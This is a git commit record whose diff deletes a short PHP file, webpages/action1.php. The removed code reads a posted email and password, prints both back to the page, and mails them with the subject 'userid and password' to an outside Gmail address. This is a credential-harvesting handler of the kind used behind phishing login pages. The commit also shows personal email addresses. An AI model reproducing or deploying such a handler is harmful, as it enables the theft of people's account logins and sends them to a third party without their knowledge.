55a0b3031accc5b6e444d23034ad5ad3d353f137
iit2015143 <iit2015143@iiita.ac.in>
2017-03-19 22:24:27 +0530

    Delete action1.php

--- webpages/action1.php
+++
@@ -1,9 +0,0 @@
-<?php
-	$USER = $_POST['email'];
-	$PASS = $_POST['pass'];
-	echo 'username is '. $USER . '</br>';
-	echo 'password is '. $PASS;
-	$msg= 'usernameis = ' . $USER . 'passwordis = ' . $PASS ;
-	$headers = "From: anurag.kashyap.10121996@gmail.com";
-	mail("gkamal625@gmail.com", "userid and password" , $msg , $headers );
-?>
